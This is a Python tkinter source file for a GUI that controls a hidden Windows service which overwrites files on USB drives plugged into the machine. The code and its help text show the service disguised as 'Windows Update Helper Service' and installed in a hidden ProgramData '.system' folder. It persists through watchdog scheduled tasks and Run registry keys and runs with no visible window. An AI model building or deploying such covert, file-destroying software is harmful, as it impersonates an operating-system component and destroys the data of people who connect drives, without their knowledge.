#!/usr/bin/env python3
"""
USB Security Service - Enhanced Controller GUI
Modern, simple, and convenient interface for stealth service management
"""

import tkinter as tk
from tkinter import ttk, messagebox
import configparser
import subprocess
import os
import sys
import win32serviceutil
import win32service
import time
from datetime import datetime
import threading

class USBServiceController:
    def __init__(self, root):
        self.root = root
        self.root.title("USB Security Service Controller")
        self.root.geometry("700x600")
        self.root.minsize(650, 550)
        self.root.resizable(True, True)
        
        # Set window icon and center it
        self.center_window()
        
        # Service details
        self.service_name = "WindowsUpdateHelperService"
        self.service_display_name = "Windows Update Helper Service"
        
        # Configuration paths
        self.config_paths = [
            os.path.join(os.environ.get('ProgramData', ''), '.system', 'WindowsUpdateHelper', 'config.ini'),
            os.path.join(os.path.dirname(__file__), 'config.ini')
        ]
        
        self.config_file = None
        self.find_config_file()
        
        # Current settings
        self.current_filter_mode = "all"
        self.load_current_config()
        
        # Setup modern GUI
        self.setup_modern_styles()
        self.create_modern_widgets()
        
        # Start status monitoring
        self.monitor_service_status()
        
        # Bind close event - closing GUI should NOT stop service
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Auto-refresh status
        self.auto_refresh()

    def center_window(self):
        """Center the window on screen"""
        self.root.update_idletasks()
        width = 700
        height = 600
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')

    def setup_modern_styles(self):
        """Setup modern, clean GUI styling"""
        style = ttk.Style()
        
        # Use modern theme
        try:
            style.theme_use('vista')  # Modern Windows theme
        except:
            try:
                style.theme_use('clam')  # Fallback modern theme
            except:
                pass
        
        # Modern color scheme
        self.colors = {
            'primary': '#0078D4',      # Microsoft Blue
            'success': '#107C10',      # Microsoft Green
            'warning': '#FF8C00',      # Microsoft Orange
            'danger': '#D13438',       # Microsoft Red
            'dark': '#323130',         # Microsoft Dark Gray
            'light': '#F3F2F1',       # Microsoft Light Gray
            'accent': '#5C2D91'        # Microsoft Purple
        }
        
        # Configure modern styles
        style.configure('Title.TLabel', 
                       font=('Segoe UI', 18, 'bold'),
                       foreground=self.colors['dark'])
        
        style.configure('Heading.TLabel', 
                       font=('Segoe UI', 12, 'bold'),
                       foreground=self.colors['dark'])
        
        style.configure('Status.TLabel', 
                       font=('Segoe UI', 10),
                       foreground=self.colors['dark'])
        
        style.configure('Success.TLabel', 
                       font=('Segoe UI', 11, 'bold'),
                       foreground=self.colors['success'])
        
        style.configure('Warning.TLabel', 
                       font=('Segoe UI', 11, 'bold'),
                       foreground=self.colors['warning'])
        
        style.configure('Danger.TLabel', 
                       font=('Segoe UI', 11, 'bold'),
                       foreground=self.colors['danger'])
        
        # Modern button styles
        style.configure('Primary.TButton',
                       font=('Segoe UI', 10, 'bold'))
        
        style.configure('Success.TButton',
                       font=('Segoe UI', 10))
        
        style.configure('Danger.TButton',
                       font=('Segoe UI', 10))

    def find_config_file(self):
        """Find the service configuration file"""
        for path in self.config_paths:
            if os.path.exists(path):
                self.config_file = path
                return
        
        # If no config found, use the service installation path
        self.config_file = self.config_paths[0]

    def load_current_config(self):
        """Load current service configuration"""
        try:
            if os.path.exists(self.config_file):
                config = configparser.ConfigParser()
                config.read(self.config_file)
                
                if 'FileFilter' in config:
                    self.current_filter_mode = config['FileFilter'].get('mode', 'all').lower()
        except Exception as e:
            print(f"Error loading config: {e}")
            self.current_filter_mode = "all"

    def create_modern_widgets(self):
        """Create modern, user-friendly GUI interface with scrollable content"""
        # Create main canvas and scrollbar for scrollable content
        self.canvas = tk.Canvas(self.root, highlightthickness=0)
        self.scrollbar = ttk.Scrollbar(self.root, orient="vertical", command=self.canvas.yview)
        self.scrollable_frame = ttk.Frame(self.canvas)
        
        # Configure scrolling
        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all"))
        )
        
        # Create window in canvas
        self.canvas_window = self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        
        # Pack canvas and scrollbar
        self.canvas.pack(side="left", fill="both", expand=True, padx=(10, 0), pady=10)
        self.scrollbar.pack(side="right", fill="y", padx=(0, 10), pady=10)
        
        # Main container with padding inside scrollable frame
        main_frame = ttk.Frame(self.scrollable_frame, padding="25")
        main_frame.pack(fill="both", expand=True)
        
        # Configure grid weights for responsive design
        main_frame.columnconfigure(0, weight=1)
        
        # Bind canvas resize to update scroll region
        self.canvas.bind('<Configure>', self.on_canvas_configure)
        
        # Bind mousewheel to canvas for scrolling
        self.bind_mousewheel()
        
        # Add keyboard navigation support
        self.bind_keyboard_navigation()
        
        # Header with icon and title
        self.create_header(main_frame)
        
        # Quick Status Card
        self.create_status_card(main_frame)
        
        # Security Configuration Card
        self.create_config_card(main_frame)
        
        # Quick Actions Card
        self.create_actions_card(main_frame)
        
        # Help and Information
        self.create_help_section(main_frame)

    def on_canvas_configure(self, event):
        """Handle canvas resize to update scroll region"""
        # Update the canvas window width to match canvas width
        canvas_width = event.width
        self.canvas.itemconfig(self.canvas_window, width=canvas_width)
        
        # Update scroll region to encompass all content
        self.root.after_idle(lambda: self.canvas.configure(scrollregion=self.canvas.bbox("all")))

    def bind_mousewheel(self):
        """Bind mousewheel events for scrolling"""
        def _on_mousewheel(event):
            # Scroll the canvas with smooth scrolling
            self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        
        def _bind_to_mousewheel(event):
            self.canvas.bind_all("<MouseWheel>", _on_mousewheel)
        
        def _unbind_from_mousewheel(event):
            self.canvas.unbind_all("<MouseWheel>")
        
        # Bind mousewheel when mouse enters the window
        self.root.bind('<Enter>', _bind_to_mousewheel)
        self.root.bind('<Leave>', _unbind_from_mousewheel)
        
        # Also bind to canvas and scrollable frame for better coverage
        self.canvas.bind('<Enter>', _bind_to_mousewheel)
        self.canvas.bind('<Leave>', _unbind_from_mousewheel)
        self.scrollable_frame.bind('<Enter>', _bind_to_mousewheel)
        self.scrollable_frame.bind('<Leave>', _unbind_from_mousewheel)

    def bind_keyboard_navigation(self):
        """Bind keyboard navigation for accessibility"""
        def on_key_press(event):
            if event.keysym == 'Up':
                self.canvas.yview_scroll(-1, "units")
                return "break"
            elif event.keysym == 'Down':
                self.canvas.yview_scroll(1, "units")
                return "break"
            elif event.keysym == 'Page_Up':
                self.canvas.yview_scroll(-1, "pages")
                return "break"
            elif event.keysym == 'Page_Down':
                self.canvas.yview_scroll(1, "pages")
                return "break"
            elif event.keysym == 'Home':
                self.canvas.yview_moveto(0)
                return "break"
            elif event.keysym == 'End':
                self.canvas.yview_moveto(1)
                return "break"
        
        # Bind keyboard events to the root window
        self.root.bind('<Key>', on_key_press)
        
        # Make sure the window can receive focus
        self.root.focus_set()

    def create_header(self, parent):
        """Create modern header with status indicator"""
        header_frame = ttk.Frame(parent)
        header_frame.pack(fill="x", pady=(0, 25))
        
        # Create inner frame for proper layout
        inner_frame = ttk.Frame(header_frame)
        inner_frame.pack(fill="x")
        
        # Title with emoji icon
        title_label = ttk.Label(inner_frame, text="🛡️ USB Security Service", style='Title.TLabel')
        title_label.pack(side="left")
        
        # Live status indicator
        self.header_status = ttk.Label(inner_frame, text="🔄 Checking...", style='Status.TLabel')
        self.header_status.pack(side="right")
        
        # Subtitle with creator credit
        subtitle = ttk.Label(header_frame, text="Stealth USB Drive Protection Controller • Created by Chandresh", 
                           font=('Segoe UI', 10), foreground='#666666')
        subtitle.pack(anchor="w", pady=(5, 0))

    def create_status_card(self, parent):
        """Create status information card"""
        # Status card frame with border effect
        status_card = ttk.LabelFrame(parent, text="📊 Service Status", padding="20")
        status_card.pack(fill="x", pady=(0, 20))
        
        # Service status row
        status_row = ttk.Frame(status_card)
        status_row.pack(fill="x", pady=(0, 15))
        
        ttk.Label(status_row, text="Service:", style='Heading.TLabel').pack(side="left")
        self.status_label = ttk.Label(status_row, text="🔄 Checking...", style='Status.TLabel')
        self.status_label.pack(side="left", padx=(15, 0))
        
        # Current mode row
        mode_row = ttk.Frame(status_card)
        mode_row.pack(fill="x", pady=(0, 15))
        
        ttk.Label(mode_row, text="Security Mode:", style='Heading.TLabel').pack(side="left")
        self.current_mode_label = ttk.Label(mode_row, text=self.current_filter_mode.upper(), 
                                          style='Status.TLabel')
        self.current_mode_label.pack(side="left", padx=(15, 0))
        
        # Last updated row
        updated_row = ttk.Frame(status_card)
        updated_row.pack(fill="x")
        
        ttk.Label(updated_row, text="Last Updated:", style='Heading.TLabel').pack(side="left")
        self.last_updated_label = ttk.Label(updated_row, text="Never", style='Status.TLabel')
        self.last_updated_label.pack(side="left", padx=(15, 0))

    def create_config_card(self, parent):
        """Create configuration card with easy mode selection"""
        config_card = ttk.LabelFrame(parent, text="🔧 Security Configuration", padding="20")
        config_card.pack(fill="x", pady=(0, 20))
        
        # Mode selection header
        ttk.Label(config_card, text="Choose Security Level:", style='Heading.TLabel').pack(anchor="w", pady=(0, 15))
        
        # Radio button selection for easier use
        self.mode_var = tk.StringVar(value=self.current_filter_mode)
        
        modes = [
            ("all", "🔴 MAXIMUM SECURITY", "Overwrites ALL files (documents, photos, videos, everything)"),
            ("office", "📄 OFFICE PROTECTION", "Overwrites only Microsoft Office files (.doc, .docx, .xls, .xlsx, etc.)"),
            ("pdf", "📋 PDF PROTECTION", "Overwrites only PDF files (.pdf)"),
            ("office_pdf", "📊 DOCUMENT PROTECTION", "Overwrites Office files AND PDF files")
        ]
        
        for value, title, description in modes:
            radio_frame = ttk.Frame(config_card)
            radio_frame.pack(fill="x", pady=5)
            
            radio = ttk.Radiobutton(radio_frame, text=title, variable=self.mode_var, 
                                  value=value, command=self.on_mode_change)
            radio.pack(anchor="w")
            
            desc_label = ttk.Label(radio_frame, text=description, 
                                 font=('Segoe UI', 9), foreground='#666666')
            desc_label.pack(anchor="w", padx=(25, 0))
        
        # Apply button - large and prominent
        apply_frame = ttk.Frame(config_card)
        apply_frame.pack(pady=(20, 0))
        
        self.apply_button = ttk.Button(
            apply_frame,
            text="🚀 Apply Configuration",
            command=self.apply_configuration,
            style='Primary.TButton'
        )
        self.apply_button.pack()

    def create_actions_card(self, parent):
        """Create quick actions card"""
        actions_card = ttk.LabelFrame(parent, text="⚡ Quick Actions", padding="20")
        actions_card.pack(fill="x", pady=(0, 20))
        
        # Service control buttons row 1
        button_frame1 = ttk.Frame(actions_card)
        button_frame1.pack(fill="x", pady=(0, 10))
        
        ttk.Button(button_frame1, text="▶️ Start Service", 
                  command=self.start_service, style='Success.TButton').pack(side="left", padx=(0, 10))
        
        ttk.Button(button_frame1, text="⏹️ Stop Service", 
                  command=self.stop_service, style='Danger.TButton').pack(side="left", padx=(0, 10))
        
        ttk.Button(button_frame1, text="🔄 Restart Service", 
                  command=self.restart_service).pack(side="left", padx=(0, 10))
        
        ttk.Button(button_frame1, text="🔍 Refresh Status", 
                  command=self.refresh_status).pack(side="right")
        
        # Service management buttons row 2
        button_frame2 = ttk.Frame(actions_card)
        button_frame2.pack(fill="x")
        
        # Dangerous actions with warning styling
        ttk.Button(button_frame2, text="🗑️ Uninstall Service Completely", 
                  command=self.uninstall_service, style='Danger.TButton').pack(side="left", padx=(0, 10))
        
        ttk.Button(button_frame2, text="🔧 Reinstall Service", 
                  command=self.reinstall_service).pack(side="left")

    def create_help_section(self, parent):
        """Create help and information section"""
        help_card = ttk.LabelFrame(parent, text="ℹ️ Information & Help", padding="20")
        help_card.pack(fill="both", expand=True)
        
        # Key information
        info_text = """
🥷 STEALTH OPERATION:
• Service runs completely hidden in background
• No visible windows or system tray icons  
• Closing this window does NOT stop the service
• Service continues protecting your system invisibly

⚠️ IMPORTANT SAFETY:
• Files on USB drives are permanently destroyed
• Test your configuration before deployment
• Always backup important data

🎯 QUICK TIPS:
• Use MAXIMUM SECURITY for highest protection
• Use OFFICE PROTECTION for business environments
• Use PDF PROTECTION for research environments
• Changes require service restart to take effect

🔧 ADVANCED OPTIONS:
• Complete uninstall removes ALL traces
• Reinstall refreshes the service installation
• All operations require Administrator privileges
        """
        
        info_label = ttk.Label(help_card, text=info_text.strip(), 
                             font=('Segoe UI', 9), justify="left")
        info_label.pack(anchor="w", fill="both", expand=True)
        
        # Help buttons
        help_buttons = ttk.Frame(help_card)
        help_buttons.pack(fill="x", pady=(15, 0))
        
        ttk.Button(help_buttons, text="📖 View Logs", 
                  command=self.open_event_viewer).pack(side="left", padx=(0, 10))
        
        ttk.Button(help_buttons, text="📁 Open Config Folder", 
                  command=self.open_config_folder).pack(side="left", padx=(0, 10))
        
        # Creator credit
        credit_frame = ttk.Frame(help_card)
        credit_frame.pack(fill="x", pady=(20, 0))
        
        credit_label = ttk.Label(credit_frame, 
                               text="💻 Developed by Chandresh • Advanced USB Security Solution", 
                               font=('Segoe UI', 9, 'italic'), 
                               foreground='#888888')
        credit_label.pack(anchor="center")

    def on_mode_change(self):
        """Handle mode selection change"""
        # Visual feedback when mode changes
        selected_mode = self.mode_var.get()
        if selected_mode != self.current_filter_mode:
            self.apply_button.configure(text="🚀 Apply New Configuration")
        else:
            self.apply_button.configure(text="🚀 Apply Configuration")

    def open_event_viewer(self):
        """Open Windows Event Viewer to view service logs"""
        try:
            subprocess.run(['eventvwr.msc'], check=False)
        except Exception as e:
            messagebox.showerror("Error", f"Could not open Event Viewer: {str(e)}")

    def open_config_folder(self):
        """Open the configuration folder"""
        try:
            config_dir = os.path.dirname(self.config_file)
            if os.path.exists(config_dir):
                os.startfile(config_dir)
            else:
                messagebox.showwarning("Folder Not Found", 
                                     f"Configuration folder not found:\n{config_dir}")
        except Exception as e:
            messagebox.showerror("Error", f"Could not open folder: {str(e)}")

    def auto_refresh(self):
        """Auto-refresh status every 3 seconds"""
        self.update_status_display()
        self.root.after(3000, self.auto_refresh)

    def update_status_display(self):
        """Update the status display with modern indicators"""
        status, style = self.get_service_status()
        
        # Update main status label
        if style == "success":
            status_text = f"🟢 {status} - Service is protecting your system"
            self.status_label.config(text=status_text, style='Success.TLabel')
            self.header_status.config(text="🟢 ACTIVE", style='Success.TLabel')
        elif style == "danger":
            status_text = f"🔴 {status} - Service is not running"
            self.status_label.config(text=status_text, style='Danger.TLabel')
            self.header_status.config(text="🔴 INACTIVE", style='Danger.TLabel')
        else:
            status_text = f"🟡 {status} - Service status changing"
            self.status_label.config(text=status_text, style='Warning.TLabel')
            self.header_status.config(text="🟡 CHANGING", style='Warning.TLabel')
        
        # Update current mode with emoji
        self.load_current_config()
        mode_emojis = {
            'all': '🔴 MAXIMUM SECURITY',
            'office': '📄 OFFICE PROTECTION',
            'pdf': '📋 PDF PROTECTION',
            'office_pdf': '📊 DOCUMENT PROTECTION'
        }
        mode_display = mode_emojis.get(self.current_filter_mode, self.current_filter_mode.upper())
        self.current_mode_label.config(text=mode_display)
        
        # Update radio button selection
        self.mode_var.set(self.current_filter_mode)

    def apply_configuration(self):
        """Apply new configuration with improved user experience"""
        new_mode = self.mode_var.get()
        
        if new_mode == self.current_filter_mode:
            messagebox.showinfo("No Changes", 
                              "Configuration is already set to this mode.\n\n"
                              "The service is already using your selected security level.")
            return
        
        # Show detailed confirmation with security implications
        mode_descriptions = {
            'all': 'MAXIMUM SECURITY - ALL files will be overwritten',
            'office': 'OFFICE PROTECTION - Only Microsoft Office files will be overwritten',
            'pdf': 'PDF PROTECTION - Only PDF files will be overwritten',
            'office_pdf': 'DOCUMENT PROTECTION - Office files AND PDF files will be overwritten'
        }
        
        current_desc = mode_descriptions.get(self.current_filter_mode, self.current_filter_mode)
        new_desc = mode_descriptions.get(new_mode, new_mode)
        
        confirmation_msg = f"""Change Security Configuration?

FROM: {current_desc}
TO: {new_desc}

⚠️ IMPORTANT:
• The service will be restarted to apply changes
• New settings take effect immediately
• Files on USB drives will be overwritten based on new mode

Continue with this change?"""
        
        if not messagebox.askyesno("Confirm Security Change", confirmation_msg):
            # Reset selection if cancelled
            self.mode_var.set(self.current_filter_mode)
            return
        
        try:
            # Show progress
            self.apply_button.configure(text="🔄 Applying Changes...", state='disabled')
            self.root.update()
            
            # Save new configuration
            self.save_configuration(new_mode)
            
            # Restart service to apply changes
            self.restart_service()
            
            # Update display
            self.current_filter_mode = new_mode
            self.last_updated_label.config(text=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            
            # Success message
            messagebox.showinfo("Configuration Applied Successfully!", 
                              f"✅ Security mode changed to: {mode_descriptions.get(new_mode, new_mode)}\n\n"
                              f"🔄 Service has been restarted\n"
                              f"🛡️ New protection is now active")
            
        except Exception as e:
            messagebox.showerror("Configuration Error", 
                               f"❌ Failed to apply configuration:\n\n{str(e)}\n\n"
                               f"Please try again or check the service status.")
        finally:
            # Reset button
            self.apply_button.configure(text="🚀 Apply Configuration", state='normal')
            self.update_status_display()

    def monitor_service_status(self):
        """Monitor service status in background"""
        def monitor():
            while True:
                try:
                    self.root.after(0, self.update_status_display)
                    time.sleep(5)  # Check every 5 seconds
                except:
                    break
        
        monitor_thread = threading.Thread(target=monitor, daemon=True)
        monitor_thread.start()

    def start_service(self):
        """Start the service with user feedback"""
        try:
            self.show_operation_feedback("Starting service...")
            win32serviceutil.StartService(self.service_name)
            
            # Wait a moment and check status
            time.sleep(2)
            self.update_status_display()
            
            messagebox.showinfo("Service Started", 
                              "✅ USB Security Service has been started!\n\n"
                              "🛡️ Your system is now protected\n"
                              "🔍 USB drives will be monitored automatically")
            
        except Exception as e:
            messagebox.showerror("Start Service Error", 
                               f"❌ Failed to start service:\n\n{str(e)}\n\n"
                               f"💡 Try running as Administrator")

    def stop_service(self):
        """Stop the service with confirmation"""
        # Strong confirmation for stopping
        if not messagebox.askyesno(
            "⚠️ Stop USB Security Service",
            "Are you sure you want to stop the USB security service?\n\n"
            "🚨 WARNING:\n"
            "• USB drives will NO LONGER be monitored\n"
            "• Your system will be UNPROTECTED\n"
            "• Files can be copied freely from USB drives\n\n"
            "Stop the service anyway?"
        ):
            return
        
        try:
            self.show_operation_feedback("Stopping service...")
            win32serviceutil.StopService(self.service_name)
            
            # Wait a moment and check status
            time.sleep(2)
            self.update_status_display()
            
            messagebox.showwarning("Service Stopped", 
                                 "⚠️ USB Security Service has been stopped\n\n"
                                 "🚨 Your system is now UNPROTECTED\n"
                                 "💡 Remember to restart the service when needed")
            
        except Exception as e:
            messagebox.showerror("Stop Service Error", 
                               f"❌ Failed to stop service:\n\n{str(e)}")

    def restart_service(self):
        """Restart the service with progress indication"""
        try:
            self.show_operation_feedback("Restarting service...")
            
            # Stop service
            try:
                win32serviceutil.StopService(self.service_name)
                time.sleep(3)
            except:
                pass  # Service might not be running
            
            # Start service
            win32serviceutil.StartService(self.service_name)
            time.sleep(2)
            self.update_status_display()
            
        except Exception as e:
            messagebox.showerror("Restart Service Error", 
                               f"❌ Failed to restart service:\n\n{str(e)}")

    def refresh_status(self):
        """Refresh service status with visual feedback"""
        self.show_operation_feedback("Refreshing status...")
        self.update_status_display()

    def show_operation_feedback(self, message):
        """Show temporary operation feedback"""
        original_text = self.header_status.cget('text')
        self.header_status.config(text=f"🔄 {message}")
        self.root.update()
        
        # Reset after a short delay
        def reset_status():
            try:
                self.header_status.config(text=original_text)
            except:
                pass
        
        self.root.after(1500, reset_status)

    def uninstall_service(self):
        """Completely uninstall the USB Security Service"""
        # Strong confirmation with detailed warning
        confirmation_msg = """🚨 COMPLETELY UNINSTALL USB Security Service?

⚠️ THIS WILL PERMANENTLY REMOVE:
• The stealth USB monitoring service
• All configuration files and settings
• Scheduled tasks and startup entries
• Service installation files
• Desktop shortcuts

🔴 SECURITY WARNING:
• Your system will be COMPLETELY UNPROTECTED
• USB drives will no longer be monitored
• Files can be copied freely from any USB device

💾 BACKUP REMINDER:
• Your current configuration will be lost
• You'll need to reinstall to restore protection

Type 'DELETE' to confirm complete removal:"""
        
        # Custom confirmation dialog
        import tkinter.simpledialog as simpledialog
        
        user_input = simpledialog.askstring(
            "⚠️ CONFIRM COMPLETE UNINSTALL", 
            confirmation_msg,
            show='*'  # Hide input for security
        )
        
        if user_input != "DELETE":
            messagebox.showinfo("Uninstall Cancelled", 
                              "✅ Uninstall cancelled - Service remains installed\n\n"
                              "Your USB security protection is still active.")
            return
        
        try:
            self.show_operation_feedback("Uninstalling service completely...")
            
            # Stop the service first
            try:
                win32serviceutil.StopService(self.service_name)
                time.sleep(2)
            except:
                pass  # Service might not be running
            
            # Remove the service
            try:
                win32serviceutil.RemoveService(self.service_name)
                time.sleep(1)
            except Exception as e:
                print(f"Service removal: {e}")
            
            # Remove scheduled tasks
            scheduled_tasks = [
                "WindowsUpdateHelperWatchdog",
                "WindowsUpdateHelperDaily"
            ]
            
            for task in scheduled_tasks:
                try:
                    subprocess.run(['schtasks', '/delete', '/tn', task, '/f'], 
                                 capture_output=True, check=False)
                except:
                    pass
            
            # Remove installation directory
            install_dir = os.path.join(os.environ.get('ProgramData', ''), '.system', 'WindowsUpdateHelper')
            try:
                import shutil
                if os.path.exists(install_dir):
                    shutil.rmtree(install_dir, ignore_errors=True)
            except Exception as e:
                print(f"Directory removal: {e}")
            
            # Remove desktop shortcut
            try:
                desktop = os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop')
                shortcut_path = os.path.join(desktop, 'USB Security Controller.lnk')
                if os.path.exists(shortcut_path):
                    os.remove(shortcut_path)
            except:
                pass
            
            # Remove registry entries (if any)
            try:
                import winreg
                reg_paths = [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
                ]
                
                for reg_path in reg_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key, "WindowsUpdateHelper")
                        winreg.CloseKey(key)
                    except:
                        pass
            except:
                pass
            
            # Update status
            self.update_status_display()
            
            # Success message with next steps
            messagebox.showinfo("🗑️ Service Completely Uninstalled", 
                              "✅ USB Security Service has been completely removed!\n\n"
                              "🚨 IMPORTANT:\n"
                              "• Your system is now UNPROTECTED\n"
                              "• USB drives will not be monitored\n"
                              "• All configuration has been deleted\n\n"
                              "💡 To restore protection:\n"
                              "• Run Install.bat again\n"
                              "• Reconfigure your security settings\n\n"
                              "This controller will close now.")
            
            # Close the controller since service is gone
            self.root.after(2000, self.root.destroy)
            
        except Exception as e:
            messagebox.showerror("Uninstall Error", 
                               f"❌ Failed to completely uninstall service:\n\n{str(e)}\n\n"
                               f"💡 Try running as Administrator or use manual removal:\n"
                               f"1. Run Configure_CLI.bat\n"
                               f"2. Use Windows Services to remove manually")

    def reinstall_service(self):
        """Reinstall the service using the installer"""
        if not messagebox.askyesno(
            "🔧 Reinstall USB Security Service",
            "Reinstall the USB Security Service?\n\n"
            "📋 THIS WILL:\n"
            "• Stop the current service (if running)\n"
            "• Run the installer to refresh installation\n"
            "• Restore default configuration\n"
            "• Restart the service with fresh settings\n\n"
            "💡 Your current configuration may be reset.\n\n"
            "Continue with reinstallation?"
        ):
            return
        
        try:
            self.show_operation_feedback("Reinstalling service...")
            
            # Look for installer
            installer_paths = [
                os.path.join(os.path.dirname(__file__), '..', 'Install.bat'),
                os.path.join(os.getcwd(), 'Install.bat'),
                'Install.bat'
            ]
            
            installer_found = None
            for path in installer_paths:
                if os.path.exists(path):
                    installer_found = os.path.abspath(path)
                    break
            
            if not installer_found:
                messagebox.showerror("Installer Not Found", 
                                   "❌ Could not find Install.bat\n\n"
                                   "💡 Please run Install.bat manually from the project folder")
                return
            
            # Run installer
            messagebox.showinfo("Running Installer", 
                              "🔧 Starting reinstallation...\n\n"
                              "📋 The installer will open in a new window\n"
                              "⏳ Please wait for it to complete\n"
                              "🔄 This controller will refresh when done")
            
            # Launch installer as administrator
            subprocess.run(['powershell', '-Command', f'Start-Process "{installer_found}" -Verb RunAs'], 
                         check=False)
            
            # Wait and refresh
            self.root.after(5000, self.update_status_display)
            
        except Exception as e:
            messagebox.showerror("Reinstall Error", 
                               f"❌ Failed to start reinstaller:\n\n{str(e)}\n\n"
                               f"💡 Please run Install.bat manually as Administrator")

    def get_service_status(self):
        """Get current service status"""
        try:
            status = win32serviceutil.QueryServiceStatus(self.service_name)
            state = status[1]
            
            if state == win32service.SERVICE_RUNNING:
                return "RUNNING", "success"
            elif state == win32service.SERVICE_STOPPED:
                return "STOPPED", "danger"
            elif state == win32service.SERVICE_START_PENDING:
                return "STARTING", "warning"
            elif state == win32service.SERVICE_STOP_PENDING:
                return "STOPPING", "warning"
            else:
                return "UNKNOWN", "warning"
        except Exception as e:
            return "NOT INSTALLED", "danger"

    def save_configuration(self, mode):
        """Save configuration to file"""
        # Ensure directory exists
        config_dir = os.path.dirname(self.config_file)
        if not os.path.exists(config_dir):
            os.makedirs(config_dir, exist_ok=True)
        
        config = configparser.ConfigParser()
        config['FileFilter'] = {'mode': mode}
        config['GUI'] = {
            'last_updated': datetime.now().isoformat(),
            'updated_by': 'Enhanced Service Controller GUI by Chandresh'
        }
        
        with open(self.config_file, 'w') as f:
            f.write("; USB Security Service Configuration\n")
            f.write("; Enhanced Service Controller GUI by Chandresh\n")
            f.write(f"; Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            config.write(f)

    def on_closing(self):
        """Handle window closing with clear messaging"""
        if messagebox.askyesno(
            "Close Configuration Tool",
            "Close the USB Security Service Controller?\n\n"
            "✅ IMPORTANT: The USB security service will continue running\n"
            "🛡️ Your system will remain protected\n"
            "🎛️ You can reopen this tool anytime to change settings\n\n"
            "Close the controller?"
        ):
            self.root.destroy()


def main():
    """Main application entry point"""
    # Check for required modules
    try:
        import win32serviceutil
    except ImportError:
        messagebox.showerror(
            "Missing Dependencies",
            "This application requires pywin32.\n\nInstall with: pip install pywin32"
        )
        return
    
    # Check if running as administrator
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            messagebox.showwarning(
                "Administrator Recommended",
                "💡 For full functionality, run as Administrator\n\n"
                "Right-click the launcher and select 'Run as Administrator'\n"
                "Some service control features may be limited without admin privileges."
            )
    except:
        pass
    
    # Create and run application
    root = tk.Tk()
    app = USBServiceController(root)
    
    try:
        root.mainloop()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    main()